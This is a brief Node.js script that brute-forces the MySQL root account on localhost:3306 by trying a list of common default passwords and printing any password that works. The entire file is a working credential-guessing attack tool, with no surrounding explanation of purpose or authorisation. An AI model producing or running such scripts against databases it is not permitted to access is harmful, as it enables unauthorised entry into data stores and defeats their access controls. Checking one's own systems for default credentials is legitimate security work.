const mysql = require('mysql2/promise');

async function tryLogin(password) {
    try {
        const connection = await mysql.createConnection({
            host: '127.0.0.1',
            port: 3306,
            user: 'root',
            password: password,
            connectTimeout: 2000
        });
        console.log(`SUCCESS: Password found: "${password}"`);
        await connection.end();
        return true;
    } catch (error) {
        // console.log(`Failed with "${password}": ${error.message}`);
        return false;
    }
}

async function main() {
    const passwords = ['', 'root', 'password', 'admin', '123456', 'mysql'];

    console.log('Brute-forcing common local passwords for root@localhost:3306...');

    for (const p of passwords) {
        if (await tryLogin(p)) {
            process.exit(0);
        }
    }
    console.log('FAILURE: No common password worked.');
}

main();
